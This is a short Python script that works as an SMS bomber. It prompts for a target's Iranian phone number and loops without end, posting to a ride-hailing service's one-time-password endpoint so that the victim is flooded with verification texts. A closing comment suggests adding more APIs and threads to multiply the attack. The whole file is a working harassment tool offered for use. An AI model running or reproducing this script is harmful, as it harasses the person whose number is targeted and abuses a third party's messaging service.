import requests
import time as t
import threading as th

_phNumber = input("enter the target's phone number with out \"0\" or \"+98\": ")

def send_sms(iurl, ipayload):
    while True:
        r = requests.post(iurl, json=ipayload)
        if r.status_code == 200:
            print("SUCCEED")
        else:
            print("ERROR " + str(r.status_code))
        t.sleep(1)

send_sms('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {"cellphone": "+98" + _phNumber})

# this is just using one thread and one API, if u had more APIs u can add them and use them with threading module so it does all the work at the same time.
